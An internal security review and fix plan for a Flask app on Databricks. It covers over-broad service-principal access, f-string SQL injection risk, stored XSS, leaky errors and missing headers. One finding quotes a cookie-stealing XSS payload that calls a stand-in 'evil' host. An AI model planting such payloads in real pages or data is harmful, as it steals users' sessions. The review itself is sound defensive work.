# BrickHound app — security review and OBO migration sketch

**Status:** triage / sketch (no code changes in this branch yet — this doc
collects what we'd fix, with proposed approaches per item).

**Scope:** `app/brickhound/app.py` (Flask UI) and `app/brickhound/app.yaml`
(Databricks Apps manifest). The scheduled data-collection job in
`notebooks/permission_analysis_data_collection.py` is **out of scope** for
identity changes (it must keep its broad SP grants to enumerate the account)
but its outputs influence the threat surface here.

The app is currently labeled **Experimental** in `app.yaml`, which is the
right window to fix the identity model before wider rollout.

---

## H-1 (high) — App runs every query as the app service principal

### What's happening

`app/brickhound/app.py:96-97`

```python
from databricks.sdk import WorkspaceClient
workspace_client = WorkspaceClient()
```

`WorkspaceClient()` with no args inside a Databricks App resolves to the
**app's SP identity**. The SP is granted `CAN_USE` on the SQL warehouse
(`dabs/dabs_template/template/tmp/resources/brickhound_job.yml.tmpl`) plus
`SELECT` on the `brickhound_*` UC tables (granted at install time).

Every user who can open the app sees the **full permissions graph** —
regardless of whether they'd normally have UC visibility into those
resources. For a tool whose entire purpose is "who can access what," that
inverts least-privilege.

### Recommended change — On-Behalf-Of (OBO) user authorization

[Databricks Apps auth docs](https://docs.databricks.com/aws/en/dev-tools/databricks-apps/auth)
support a `user_authorization` block that forwards the logged-in user's
identity to API calls. With OBO, `WorkspaceClient` constructed per-request
acts as the user, and UC enforces existing grants on `brickhound_*` tables.

#### `app/brickhound/app.yaml` — declare user authorization

```yaml
# add alongside the existing config: block
user_authorization:
  scopes:
    - sql           # required — Statement Execution against the warehouse
    - iam.access-control:read   # if the SDK probes group membership directly
```

(Exact scope list to be confirmed against the Apps docs; the minimum is
`sql` for warehouse calls.)

#### `app/brickhound/app.py:get_connection()` — build client from user token

Today (lines 93-123) `get_connection()` constructs a process-wide
`WorkspaceClient()`. After OBO it must construct a per-request client from
the headers Databricks Apps injects:

```python
def get_connection():
    user_token = request.headers.get("X-Forwarded-Access-Token")
    if not user_token:
        raise RuntimeError(
            "Missing X-Forwarded-Access-Token — the app must be configured "
            "with user_authorization in app.yaml"
        )
    workspace_client = WorkspaceClient(token=user_token)
    warehouse_id = os.getenv("WAREHOUSE_ID")
    if not warehouse_id:
        raise ValueError("WAREHOUSE_ID not set in app.yaml")
    return workspace_client, warehouse_id
```

Cache nothing across requests (no `_logged` flag, no `WorkspaceClient`
reuse) — every request gets a fresh client bound to that user's token.

#### Install / docs — grant a group, not the SP

Today the install grants the app SP `SELECT` on `brickhound_vertices`,
`brickhound_edges`, `brickhound_collection_metadata`. Replace with a UC
group (e.g. `sat_brickhound_users`) and document that admins add users to
the group. The data-collection job's SP keeps the `MODIFY` it needs to
write the tables.

### Caveats

- Per-request `WorkspaceClient` construction adds a small latency hit per
  call — fine for an interactive analytics UI.
- We need to verify our `databricks-sdk` floor (`>=0.20.0` in
  `requirements.txt`) honors the `token=` constructor arg correctly with
  the Statement Execution API.
- Some endpoints currently iterate Databricks data structures in Python
  (e.g. `escalation-paths`); whatever the SDK fetches there will also be
  scoped to the user. Need to confirm those flows still produce useful
  results for non-admins.

---

## H-2 (high) — SQL built by f-string interpolation; `sanitize()` is brittle

### What's happening

The file-wide pattern is:

```python
def sanitize(value):
    if not value:
        return ""
    return str(value).replace("'", "''")
```

…then `f"WHERE id = '{sanitize(value)}'"` everywhere. Examples:

- `app.py:5008` — `resource_id = data.get('resource', '')` → passed to
  `find_resource` → `f"WHERE ... id = '{safe_id}'"`
- `app.py:5320` — `principal_id = data.get('principal', '')` → ditto
- `app.py:6109, 6342, 6392` — same shape
- `app.py:7314-7328` — `workspace_id` and `scope_name` flow through
  `sanitize()` then a `LIKE '%...%'` pattern; `%` and `_` aren't escaped,
  so a user-supplied value like `"%"` matches everything (low impact —
  authorization-wise it's the same data, but it's a sign of the pattern
  drifting).

`sanitize()` only escapes the single quote. It does not handle:

- Backslash sequences (Spark SQL doesn't honor C-style escapes by default,
  so this is mostly a non-issue, but defensive coding would not assume).
- Unicode line/paragraph separators (` `, ` `) — depending on
  parser, they don't matter here, but bind parameters always do.
- LIKE wildcards `%` and `_` (relevant to search endpoints).
- Anyone who later refactors a literal-position interpolation into an
  identifier-position interpolation (e.g. `FROM {sanitize(table)}` would
  be fully exploitable).

OBO (H-1) **mitigates the blast radius** at the UC layer — even if
injected SQL ran, it would only see what the user's grants allow. But
broken queries from injection still cause errors and log noise, and an
admin user opening the app remains a privilege-escalation surface.

### Recommended change — bind parameters via Statement Execution API

The Databricks Statement Execution API supports named parameters. Convert
all literal-position interpolations to bind params. Identifier positions
(table names, the `run_id` SQL-identifier-shaped value) keep using the
existing allowlist (`_VALID_RUN_ID_RE`) — that's already correct.

Sketch of `exec_query_df` updated to take params:

```python
def exec_query_df(sql_query, params=None):
    workspace_client, warehouse_id = get_connection()
    kwargs = {
        "warehouse_id": warehouse_id,
        "catalog": CATALOG,
        "schema": SCHEMA,
        "statement": sql_query,
        "wait_timeout": "50s",
    }
    if params:
        kwargs["parameters"] = [
            {"name": k, "value": str(v) if v is not None else None,
             "type": "STRING"}
            for k, v in params.items()
        ]
    result = workspace_client.statement_execution.execute_statement(**kwargs)
    # ...existing row materialization unchanged
```

Caller-site sketch (`find_resource`):

```python
query = """
SELECT id, name, display_name, email, node_type, owner
FROM IDENTIFIER(:vertices_table)
WHERE run_id = :run_id
  AND (id = :ident
       OR LOWER(name) = LOWER(:ident)
       OR LOWER(display_name) = LOWER(:ident))
  AND node_type NOT IN ('User','Group','ServicePrincipal',
                        'AccountUser','AccountGroup','AccountServicePrincipal')
LIMIT 1
"""
return exec_query_df(query, params={
    "vertices_table": VERTICES_TABLE,
    "run_id": run_id,
    "ident": identifier,
})[0]
```

Notes:

- `IDENTIFIER(:name)` is the standard way to bind an identifier in DB SQL.
- `_VALID_RUN_ID_RE` (`app.py:20`) stays — `run_id` is still an
  allowlisted token, just bound rather than f-stringed.
- `sanitize()` can be retired once every site is converted.

### Effort

Real work — 25+ `f"{...}"` SQL sites to convert, plus the helper signature
change. Recommend splitting into one PR per category (search,
who-can-access, what-can-access, escalation-paths, blast-radius, reports).

---

## M-1 (medium) — Stored XSS via `innerHTML` of server-supplied strings

### What's happening

The inline JS does many `element.innerHTML = ...` writes that include
data returned by the Flask endpoints — principal names, display names,
emails, resource names, paths, owners. Examples:

- `app.py:1912` — `headerSelector.innerHTML = optionsHTML` where
  `optionsHTML` is built from `run.run_id`, `run.collected_by`, etc.
- `app.py:2408, 2668, 2733, 2809, 2885, 3178, 3324, 3438` —
  `*-results.innerHTML = html` populated from API JSON.

The data ultimately comes from Databricks (vertex `name`, `display_name`,
`email`). Databricks UI generally restricts these strings, but:

- **Service principal display names** can contain arbitrary characters in
  some flows.
- **Group names** can include characters chosen at creation time.
- **Custom attributes** in SCIM payloads have the loosest validation.

A name like `<img src=x onerror=fetch('//evil/?'+document.cookie)>`
written into `innerHTML` would execute. Severity is medium because the
attacker needs SCIM/admin write access to plant the payload, but if they
have that they'd already have direct access; the higher-impact scenario
is a self-XSS or a low-priv user planting a payload that fires when an
admin opens the app.

### Recommended change

Two complementary moves:

1. **Server-side escape on the way out.** Wrap user-influenced fields in
   `markupsafe.escape()` before they enter JSON responses for any field
   the client renders via `innerHTML`. Cheap and explicit.

2. **Client-side: prefer `textContent` for plain strings.** Where the
   inline JS just shows a name, replace `el.innerHTML = name` with
   `el.textContent = name`. Where HTML structure is needed, build it via
   `document.createElement` and set `textContent` on the leaf nodes that
   hold user data. The big templated `${html}` blocks can keep their
   structure but interpolate user values via a helper:
   ```js
   function esc(s) {
     return String(s ?? '')
       .replace(/&/g, '&amp;').replace(/</g, '&lt;').replace(/>/g, '&gt;')
       .replace(/"/g, '&quot;').replace(/'/g, '&#39;');
   }
   ```
   then `${esc(row.name)}` in template strings.

A defense-in-depth `Content-Security-Policy: script-src 'self'` header (M-3
below) would block successful exploitation even if a payload slipped in.

---

## M-2 (medium) — Error messages leak internals

### What's happening

```python
except Exception as e:
    return jsonify({'error': str(e)}), 500
```

This pattern repeats in `api_search_principals`, `api_search_resources`,
and others. `str(e)` from a Spark/Statement-Execution error includes the
query text, table paths, and sometimes full stack frames.

Net effect: an unauthenticated path probing the API (after OBO, this is
authenticated but still low-priv) can map the internal schema and a chunk
of the SQL we run.

### Recommended change

```python
except Exception as e:
    logger.exception("api_search_principals failed")
    return jsonify({'error': 'internal error'}), 500
```

Log the full exception server-side; return a generic message. A request
ID (`uuid4().hex[:8]`) included in both the log line and the response
helps correlate without leaking content.

---

## M-3 (medium) — No security headers on Flask responses

### What's happening

Flask's default response has no CSP, no `X-Content-Type-Options`, no
`Referrer-Policy`. Combined with M-1 (innerHTML XSS), that means a payload
that lands in user data can run unrestricted.

### Recommended change

Smallest change: a single after-request hook in `app.py`:

```python
@app.after_request
def add_security_headers(resp):
    resp.headers["Content-Security-Policy"] = (
        "default-src 'self'; "
        "script-src 'self' 'unsafe-inline'; "  # tighten when inline JS is removed
        "style-src 'self' 'unsafe-inline'; "
        "img-src 'self' data:; "
        "frame-ancestors 'self'"
    )
    resp.headers["X-Content-Type-Options"] = "nosniff"
    resp.headers["Referrer-Policy"] = "no-referrer"
    return resp
```

The `'unsafe-inline'` for scripts has to stay until the inline `<script>`
in `get_main_html()` is moved out to a separate static file. Document that
as a follow-up.

Alternative: pull in `flask-talisman` and let it manage headers. Adds a
dependency for not much benefit at our size.

---

## M-4 (medium) — `print()` for app logs; query text logged with bound values

### What's happening

`get_connection`, `exec_query`, `exec_query_df`, and most route handlers
use `print(...)` for diagnostics:

- `app.py:101-117` — auth/warehouse info on first call
- `app.py:248, 268` — `print(f"[DEBUG] Executing query: {query[:100]}...")`
- `app.py:143, 180-182` — error logs with traceback printed to stdout

In a Databricks App, `print` output lands in app logs which are visible to
anyone with app permissions. The DEBUG query line includes the first 100
chars of SQL, which contains interpolated values today (after H-2 it
contains only param placeholders, but until then it leaks user input
back into logs).

### Recommended change

- Switch all `print()` to `logger.info`/`logger.debug` (the module already
  configures one at line 35-36) so log level can gate noise.
- Either remove the query-preview line or log only the call site name and
  param keys (never values).
- Configure log level via env var (`LOG_LEVEL`) so admins can dial down
  noise post-deploy.

---

## L-1 (low) — No rate limiting / no DoS bound on heavy endpoints

### What's happening

`/api/escalation-paths`, `/api/blast-radius`, `/api/impersonation-paths`,
`/api/who-can-access`, `/api/what-can-access` all run recursive CTEs and
in-process BFS. The CTEs cap at depth 10; the Python BFS has caps too.
But there's no per-IP or per-user rate limit, so a hostile or buggy
caller can chain warehouse queries and burn DBUs.

### Recommended change

Lightweight: add `flask-limiter` with sane defaults
(`10/minute` on the heavy endpoints, `60/minute` on search).

Per-user limits make sense after OBO (H-1) lands, since we then have a
stable user identity to key on.

---

## L-2 (low) — Unpinned dependencies

### What's happening

`app/brickhound/requirements.txt`:

```
flask>=2.0.0
pandas>=1.5.0
databricks-sql-connector>=3.0.0
databricks-sdk>=0.20.0
werkzeug>=2.0.0
```

`>=` floors with no upper bound mean every Apps deploy resolves whatever
PyPI ships that day. Reproducibility, supply-chain-pinning, and rollback
all suffer. (`pandas` isn't even imported in `app.py` — confirm and
remove.)

### Recommended change

- Pin to the version we tested against (e.g. `flask==3.0.3`).
- Drop `pandas` if unused.
- Optionally: add a `requirements.in` + `pip-compile`-generated
  `requirements.txt` for transitive pinning.

---

## L-3 (low) — `databricks-sql-connector` listed but unused

### What's happening

`requirements.txt` lists `databricks-sql-connector>=3.0.0` but `app.py`
uses only `databricks-sdk`'s Statement Execution API. Confirm and remove.

---

## Out of scope for this branch

- The data-collection job's identity (must remain SP).
- Changes to the dashboard / SAT driver.
- Refactoring the inline JS into a build-time bundle (would unblock a
  stricter CSP — separate effort).
- Threat modeling for the data-collection notebook itself
  (`notebooks/permission_analysis_data_collection.py`).

---

## Suggested rollout order on `feature/app_obo_permission_fixes`

| Order | Item | Why first |
|---|---|---|
| 1 | M-2 error-message scrubbing + M-4 logger conversion | Smallest diff, no behavior change, enables safer triage of 2-5. |
| 2 | M-3 security headers | Single hook, defense-in-depth for steps 3-5. |
| 3 | M-1 XSS via `innerHTML` (server escape + `textContent`) | High-leverage, no API surface change. |
| 4 | H-2 SQL parameterization | Largest diff; do as several incremental commits per route group. |
| 5 | H-1 OBO migration + install/docs update | Touches deploy + docs + UC grants; do last after the app itself is hardened. |
| 6 | L-1 rate limiting | Optional but easy after H-1 lands (per-user keying). |
| 7 | L-2 / L-3 dependency cleanup | Drop-in PR. |

Each item is independent — they can land in separate PRs if reviewer load
is the bottleneck.

---

## Verification plan (per item)

- **H-1 OBO:** deploy to a non-admin tester. Confirm:
  - Health endpoint still works (no auth required).
  - Search endpoints return only the principals/resources the tester can
    SELECT in UC (test by revoking a grant before running).
  - Admin user with full UC grants sees the same results as today.
  - App logs show `auth_type` reflecting the user-token path.

- **H-2 parameterization:** for each converted endpoint, exercise inputs
  containing `'`, `\`, `;`, `--`, and `%` and confirm the query still
  returns clean results (no error path leaking the original SQL).

- **M-1 XSS:** seed UC with a vertex whose `display_name` is
  `<img src=x onerror=alert(1)>`. Open the app. Payload should render as
  literal text in the principal-search list. Repeat for resource search
  and the path-rendering pages.

- **M-2 error scrubbing:** trigger errors (drop a UC table, point
  `WAREHOUSE_ID` to a non-existent warehouse). Response should be
  `{"error": "internal error"}` with a request-id; logs should have the
  full traceback.

- **M-3 headers:** `curl -I` the app root, confirm CSP and the other
  headers present.

- **M-4 logger:** set `LOG_LEVEL=WARNING`, run a normal session, confirm
  no DEBUG noise. Set `DEBUG`, confirm structured info (no SQL bodies).

- **L-1 rate limit:** scripted 30 calls/sec to a heavy endpoint should
  start receiving 429.
